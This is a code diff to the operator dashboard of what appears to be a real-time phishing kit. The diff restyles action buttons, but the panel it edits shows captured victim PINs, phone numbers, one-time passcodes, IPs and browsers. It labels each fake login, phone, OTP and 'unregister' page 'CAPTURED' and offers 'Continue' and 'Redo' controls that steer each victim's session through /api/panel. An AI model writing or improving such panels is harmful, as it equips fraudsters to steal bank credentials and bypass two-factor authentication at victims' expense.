@@ -59,6 +59,33 @@
     }
     .btn:hover { background: rgba(255,255,255,.15); border-color: rgba(255,255,255,.2); }
 
+    .icon-btn {
+      width: 32px;
+      height: 32px;
+      padding: 6px;
+      border-radius: 6px;
+      border: 1px solid rgba(255,255,255,.08);
+      background: rgba(255,255,255,.08);
+      cursor: pointer;
+      transition: all .18s ease;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .icon-btn:hover { 
+      background: rgba(255,255,255,.15); 
+      border-color: rgba(255,255,255,.2);
+      transform: scale(1.05);
+    }
+    .icon-btn svg {
+      width: 18px;
+      height: 18px;
+      fill: currentColor;
+    }
+    .icon-btn.continue { color: var(--green); }
+    .icon-btn.redo { color: var(--red); }
+    .icon-btn.manage { color: var(--blue); }
+
     .cred { font-family: monospace; font-size: .8rem; background: #f1f1f1; padding: 2px 4px; border-radius: 3px; color:#000; }
     .detail { font-size: 12px; color: var(--text-muted); margin-top: 8px; }
     #modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,.75); align-items: center; justify-content: center; z-index: 1000; }
@@ -148,6 +175,11 @@
     .status-connected { color: var(--blue); }
     .status-captured { color: var(--green); }
     .status-waiting { color: var(--yellow); }
+
+    .action-btns {
+      display: flex;
+      gap: 6px;
+    }
   </style>
 </head>
 <body>
@@ -167,7 +199,7 @@
         Active Sessions · <a id="domainLink" href="#" target="_blank" style="color:#007bff;text-decoration:none;"></a>
       </div>
       <table id="tbl"><thead><tr>
-        <th>#</th><th>Client</th><th>PIN</th><th>Phone</th><th>OTP</th><th>IP</th><th>Platform</th><th>Browser</th><th>Status</th><th></th>
+        <th>#</th><th>Client</th><th>PIN</th><th>Phone</th><th>OTP</th><th>IP</th><th>Platform</th><th>Browser</th><th>Status</th><th>Actions</th>
       </tr></thead><tbody></tbody></table>
       <div id="empty">No active sessions</div>
     </div>
@@ -180,8 +212,6 @@
       </div>
       <div id="modalBody" style="font-size:13px;line-height:1.6"></div>
       <div style="margin-top:1.25rem;display:flex;gap:8px">
-        <button id="redoBtn"  class="btn" onclick="act('redo',  currentSid)">🔁 Redo</button>
-        <button id="contBtn"  class="btn" onclick="act('cont',  currentSid)">✅ Continue</button>
         <button class="btn" onclick="act('delete',currentSid)">🗑 Delete</button>
       </div>
     </div>
@@ -191,6 +221,13 @@
     let currentSid = null;
     const qs = s => document.querySelector(s);
     let lastSessions = new Map();
+
+    // SVG Icons
+    const svgs = {
+      continue: `<svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M7 7h10v10H7z"/><path d="M3 3h4v4H3zm0 14h4v4H3zM17 3h4v4h-4zm0 14h4v4h-4z" opacity=".3"/><path d="M8 8h8v8H8z"/></svg>`,
+      redo: `<svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M3 3h18v18H3z"/><path d="M8 8h8v8H8z" opacity=".3"/><path d="M7 7h10v10H7z"/></svg>`,
+      manage: `<svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M4 4h16v16H4z" opacity=".3"/><path d="M6 6h12v2H6zm0 4h12v2H6zm0 4h8v2H6z"/></svg>`
+    };
 
     function updateClock(){
       const now = new Date();
@@ -216,12 +253,10 @@
       let statusText = '';
       let statusClass = '';
       
-      // Determine status based on current page and what data has been entered FOR THAT PAGE
       if (s.page === 'success') {
         statusText = 'APPROVED';
         statusClass = 'status-captured';
       } else if (s.page === 'otp.html') {
-        // On OTP page - check if OTP entered
         if (s.otp) {
           statusText = 'CAPTURED';
           statusClass = 'status-captured';
@@ -230,7 +265,6 @@
           statusClass = 'status-connected';
         }
       } else if (s.page === 'unregister.html') {
-        // On Unregister page - check if clicked
         if (s.unregisterClicked) {
           statusText = 'CAPTURED';
           statusClass = 'status-captured';
@@ -239,7 +273,6 @@
           statusClass = 'status-connected';
         }
       } else if (s.page === 'verify.html') {
-        // On Phone page - check if phone entered
         if (s.phone) {
           statusText = 'CAPTURED';
           statusClass = 'status-captured';
@@ -248,7 +281,6 @@
           statusClass = 'status-connected';
         }
       } else if (s.page === 'index.html') {
-        // On Login page - check if credentials entered
         if (s.entered) {
           statusText = 'CAPTURED';
           statusClass = 'status-captured';
@@ -265,6 +297,29 @@
         <span class="status-page">${page}</span>
         <span class="status-action ${statusClass}">• ${statusText}</span>
       </div>`;
+    }
+
+    function getActionButtons(s) {
+      const showRedo = !(s.page === 'success' || (s.page === 'unregister.html' && s.unregisterClicked));
+      const showCont = s.page !== 'success';
+      
+      let html = '<div class="action-btns">';
+      
+      // Manage button (always show)
+      html += `<button class="icon-btn manage" onclick="showDetail('${s.sid}')" title="View Details">${svgs.manage}</button>`;
+      
+      // Continue button
+      if (showCont) {
+        html += `<button class="icon-btn continue" onclick="act('cont', '${s.sid}')" title="Continue">${svgs.continue}</button>`;
+      }
+      
+      // Redo button
+      if (showRedo) {
+        html += `<button class="icon-btn redo" onclick="act('redo', '${s.sid}')" title="Redo">${svgs.redo}</button>`;
+      }
+      
+      html += '</div>';
+      return html;
     }
 
     /* ----------  ALERT SYSTEM  ---------- */
@@ -361,7 +416,7 @@
           <td>${s.platform}</td>
           <td>${s.browser}</td>
           <td>${getStatusDisplay(s)}</td>
-          <td><button class="btn" onclick="showDetail('${s.sid}')">Manage</button></td>
+          <td>${getActionButtons(s)}</td>
         </tr>`).join('');
     }
 
@@ -385,15 +440,14 @@
         <div class="detail">User-Agent</div><div style="word-break:break-all">${s.ua}</div>
         <div class="detail">Date</div><div>${localDate}</div>`;
 
-      qs('#redoBtn').style.display  = (s.page==='success' || (s.page==='unregister.html' && s.unregisterClicked)) ? 'none':'inline-block';
-      qs('#contBtn').style.display  =  s.page==='success' ? 'none':'inline-block';
-      qs('#modal').style.display   = 'flex';
+      qs('#modal').style.display = 'flex';
     }
     function closeModal(){ qs('#modal').style.display='none'; }
 
     async function act(action,sid){
       await fetch('/api/panel',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action,sid})});
-      closeModal(); load();
+      if (qs('#modal').style.display === 'flex') closeModal();
+      load();
     }
 
     let jsonData = {};
